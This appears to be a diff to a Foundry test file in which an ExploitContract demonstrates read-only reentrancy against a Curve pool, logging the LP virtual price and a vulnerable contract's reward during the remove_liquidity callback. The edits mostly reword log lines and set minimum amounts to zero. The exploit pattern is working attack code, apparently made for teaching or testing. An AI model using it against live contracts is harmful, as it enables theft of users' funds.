@@ -98,56 +98,35 @@ contract ExploitContract {
     // Stake LP into VulnContract
     function stakeTokens() external payable {
         uint[2] memory amounts = [msg.value, 0];
-        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
-        console.log(
-            "LP token price after staking into VulnContract",
-            pool.get_virtual_price()
-        );
-
+        uint lp = pool.add_liquidity{value: msg.value}(amounts, 0);
         lpToken.approve(address(target), lp);
         target.stake(lp);
+        console.log("curve lp price after stake", pool.get_virtual_price());
     }
 
     // Perform Read-Only Reentrancy
     function performReadOnlyReentrnacy() external payable {
-        // Add liquidity to Curve
         uint[2] memory amounts = [msg.value, 0];
-        uint lp = pool.add_liquidity{value: msg.value}(amounts, 1);
-        // Log get_virtual_price
-        console.log(
-            "LP token price before remove_liquidity()",
-            pool.get_virtual_price()
-        );
-        // Remove liquidity from Curve
-        // remove_liquidity() invokes the recieve() callback
-        uint[2] memory min_amounts = [uint(0), uint(0)];
-        pool.remove_liquidity(lp, min_amounts);
-        // Log get_virtual_price
-        console.log(
-            "--------------------------------------------------------------------"
-        );
-        console.log(
-            "LP token price after remove_liquidity()",
-            pool.get_virtual_price()
-        );
+        uint lp = pool.add_liquidity{value: msg.value}(amounts, 0);
+        console.log("curve before remove liquidity", pool.get_virtual_price());
 
-        // Attack - Log reward amount
-        uint reward = target.getReward();
-        console.log("Reward if Read-Only Reentrancy is not invoked: ", reward);
+        uint[2] memory minamounts = [uint(0), uint(0)];
+
+        pool.remove_liquidity(lp, minamounts);
+        console.log("curve after remove liquidity", pool.get_virtual_price());
+        console.log(
+            "actual reward which should be received",
+            target.getReward()
+        );
     }
 
     receive() external payable {
-        // receive() is called when the remove_liquidity is called
+        // receive() is  when the remove_liquidity is called
+        console.log("curve during remove liquidity", pool.get_virtual_price());
         console.log(
-            "--------------------------------------------------------------------"
+            "reward can be received during remove liquidity",
+            target.getReward()
         );
-        console.log(
-            "LP token price during remove_liquidity()",
-            pool.get_virtual_price()
-        );
-        // Attack - Log reward amount
-        uint reward = target.getReward();
-        console.log("Reward if Read-Only Reentrancy is invoked: ", reward);
     }
 }
 
@@ -162,7 +141,7 @@ contract ExploitTest is Test {
     }
 
     function testPwn() public {
-        hack.stakeTokens{value: 10 ether}(); // stake 10 eth in VulnContract
+        hack.stakeTokens{value: 10 ether}();
         hack.performReadOnlyReentrnacy{value: 100000 ether}();
     }
 }
